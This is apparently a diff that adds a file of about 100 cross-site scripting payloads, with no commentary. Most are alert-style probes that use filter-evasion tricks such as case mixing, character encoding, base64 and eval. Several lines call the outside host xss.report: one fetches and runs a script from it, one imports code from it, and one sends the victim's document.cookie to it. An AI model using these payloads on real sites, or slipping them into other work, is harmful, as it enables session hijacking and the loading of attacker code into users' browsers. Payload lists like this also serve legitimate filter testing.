@@ -1,0 +1,100 @@
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>confirm(1)</script>
+<script>prompt(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<details open ontoggle=alert(1)>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<iframe src="javascript:alert(1)"></iframe>
+<input autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<button autofocus onfocus=alert(1)>
+<a href="javascript:alert(1)">Click Me</a>
+<img src="javascript:alert(1)">
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<marquee onstart=alert(1)>
+<svg/onload=alert(1)>
+<xss onmouseover=alert(1)>
+<b onmouseover=alert(1)>test</b>
+<i onmouseenter=alert(1)>test</i>
+<u onclick=alert(1)>Click</u>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script>$.getScript('//xss.report/c/ali')</script>
+<script>alert(document.cookie)</script>
+<script>alert(document.domain)</script>
+<script>console.log('XSS')</script>
+<svg><script>alert(1)</script></svg>
+<math><brute href="javascript:alert(1)">click
+<isindex type=image src=1 onerror=alert(1)>
+<plaintext>
+<sCrIpT>alert(1)</sCrIpT>
+<SCRIPT>alert(1)</SCRIPT>
+<img src=x oneNneRrOr=alert(1)>
+<svg oNlOaD=alert(1)>
+<svg/onLoad="confirm(1)">
+<img src="x"onerror="alert(1)">
+<img src=x:alert(alt) alt=1>
+<p onwheel=alert(1)>Scroll over me</p>
+<div onpointerover="alert(1)">Pointer over me</div>
+<li onfocusin=alert(1) autofocus>
+<form><button formaction=javascript:alert(1)>Submit</button></form>
+<input onauxclick=alert(1)>
+<details/open/ontoggle=alert(1)>
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<xmp><script>alert(1)</script></xmp>
+<noembed><script>alert(1)</script></noembed>
+<noscript><script>alert(1)</script></noscript>
+"onmouseover="alert(1)
+'onmouseover='alert(1)
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+`><script>alert(1)</script>
+";alert(1);//
+';alert(1);//
+--><script>alert(1)</script>
+]><script>alert(1)</script>
+<script>alert`1`</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+<a href="j&#97;v&#97;scr&#105;pt:alert(1)">Click</a>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject></svg>
+jaVasCript:/*-/*`/*\"/*'/*\/*--%3E%3C/title%3E%3C/style%3E%3C/textarea%3E%3C/script%3E%3C/xmp%3E%3Csvg/onload='+/\"/+/onmouseover=1/*%3E%3Cimg/src=%22x%22/onerror=alert(1)%3E//'/
+<svg/onload=eval(atob('YWxlcnQoMSk='))>
+<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+%3Cscript%3Ealert(1)%3C/script%3E
+%253Cscript%253Ealert(1)%253C/script%253E
+<img src="x" onerror="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
+<script>setTimeout('alert(1)',0)</script>
+<svg/onload='fetch("//xss.report/c/ali?c="+document.cookie)'>
+<script>location='javascript:alert(1)'</script>
+<iframe src="javascript:alert(document.domain)" onmouseover="alert(1)"></iframe>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click me</a>
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<svg onload="javascript:alert(1)" xmlns="http://www.w3.org/2000/svg"></svg>
+<details open ontoggle="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+<math><mtext><option><annotation><img src/onerror=alert(1)></annotation></option></mtext></math>
+<p style="width: expression(alert(1));">
+<div style="background-image: url(&quot;javascript:alert(1)&quot;)">
+<object data="data:text/html,<script>alert(1)</script>">
+<a href="javascript:%61%6C%65%70%74%28%31%29">Click</a>
+<img src=x onerror="[1].map(alert)">
+<script>new Function('alert(1)')()</script>
+<script>eval('\x61\x6C\x65\x72\x74\x28\x31\x29')</script>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<video><source onerror="alert(1)">
+<svg><image href="javascript:alert(1)">
+<svg/onload=window['al'+'ert'](1)>
+<isindex action=javascript:alert(1) type=image>
+<iframe src=javascript:alert(1)></iframe>
+<object window.onload=alert(1)>
+<svg onload=import('//xss.report/c/ali')>
+<script src="data:text/javascript,alert(1)"></script>
+<img src=x onerror="window.onerror=alert;throw 1">
+<details/open/ontoggle="a=alert,a(1)">
+<svg/onload="a=confirm;a(document.domain)">
